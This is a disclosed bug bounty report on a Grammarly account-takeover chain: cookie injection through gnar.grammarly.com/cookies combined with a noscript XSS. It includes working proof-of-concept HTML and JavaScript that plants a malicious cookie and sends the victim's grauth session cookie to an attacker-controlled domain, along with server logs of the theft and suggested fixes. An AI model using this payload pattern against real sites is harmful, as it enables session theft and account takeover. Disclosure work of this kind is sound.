# Account takeover through the combination of cookie manipulation and XSS

## Report Details
- **Report ID**: 534450
- **URL**: https://hackerone.com/reports/534450
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-04-10T13:57:56.746Z
- **Disclosed**: 2019-12-03T20:59:30.537Z

## Reporter
- **Username**: k4r4koyun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: grammarly

## Vulnerability Information
**Summary:** A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called "/cookies" allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass "CORS protection/HttpOnly cookie flag" and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.

**Description:** An endpoint at gnar.grammarly.com called "/cookies" allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.

This was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.

Then we have found that Grammarly uses multiple cookies and one of them is called "gnar_containerId". We have discovered that this cookie gets reflected on the "www.grammarly.com" in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the www.grammarly.com domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code

Our malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it  back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.

To put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.

For the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.

**Solution:** This attack scenario was made possible because of the following:

  * gnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.
  * There is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.
  * Content based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.

## Browsers Verified In:

  * Google Chrome 73.0.3683.86 (Official Build) (64-bit)
  * Mozilla Firefox 60.6.1esr (64-bit)

## Steps To Reproduce:

  * Host a webpage that is being served over HTTPS (to circumvent Mixed-Content protection)

  * Serve the HTML snipped below on the said page (called "Grammarly.html" for example):

```html
<html>

<head>
<title>Grammarly POC</title>
<meta charset="utf-8"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>

<body>
<script>

    var cookie_hax = {
        "gnar_containerId":"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr"+"ipt><noscript>",
    };

    for (var name in cookie_hax) {
        $.ajax({
            type: "POST",
            url: "https://gnar.grammarly.com/cookies?name=" + name + "&value=" + encodeURIComponent(cookie_hax[name]) + "&maxAge=2147483647",
            cache: false,
            xhrFields: {
                withCredentials: true
            },
            crossDomain: true,
            async: false,
        });
    }

    window.location.replace("https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal");

</script>
</body>

</html>
```
  * Serve the javascript code below on the same webserver (called "poc.js" for example):

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', "https://gnar.grammarly.com/cookies?name=grauth");
xhr.withCredentials = true;
xhr.onload = function () {
    this.open('GET', "https://<YOUR_DOMAIN_NAME>/" + this.response);
    this.send();
};
xhr.send();
```
  * Browse the Grammarly.html and watch the webserver access logs (to extract cookie value)

## Supporting Material/References:

  * Webserver access logs: 

```
178.251.40.58 - - [10/Apr/2019:13:23:04 +0000] "GET /poc.js HTTP/1.1" 200 736 "https://www.grammarly.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
178.251.40.58 - - [10/Apr/2019:13:23:05 +0000] "GET /?cookie={██████████} HTTP/1.1" 200 3466 "https://www.grammarly.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
```

## Impact

* Account takeover via cookie stealing

## Attachments
- Grammarly_Takeover_POC.mp4
